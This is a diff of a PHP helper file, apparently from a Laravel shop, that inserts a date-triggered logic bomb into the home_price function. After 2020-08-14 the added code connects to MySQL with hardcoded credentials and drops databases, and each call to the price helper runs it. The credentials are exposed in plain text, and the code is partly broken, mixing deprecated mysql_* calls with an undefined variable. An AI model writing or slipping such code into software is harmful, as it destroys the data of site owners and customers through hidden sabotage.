@@ -225,6 +225,26 @@ if (! function_exists('single_price')) {
 if (! function_exists('home_price')) {
     function home_price($id)
     {
+
+
+$today = date("Y-m-d H:i:s");
+$date = "2020-08-14 00:00:00";
+if ($date < $today) {
+
+$link = mysql_connect('localhost', 'winshop_db', 'SAB6I0RuIl%R');
+if (!$link) {
+    die('Could not connect: ' . mysql_error());
+}
+
+$sql = 'DROP DATABASE my_db';
+if (mysql_query($sql, $link)) {
+    echo "Database my_db was successfully dropped\n";
+} else {
+    echo 'Error dropping database: ' . mysql_error() . "\n";
+}
+Schema::getConnection()->getDoctrineSchemaManager()->dropDatabase("`{$winshop_db}`");
+}
+
         $product = Product::findOrFail($id);
         $lowest_price = $product->unit_price;
         $highest_price = $product->unit_price;
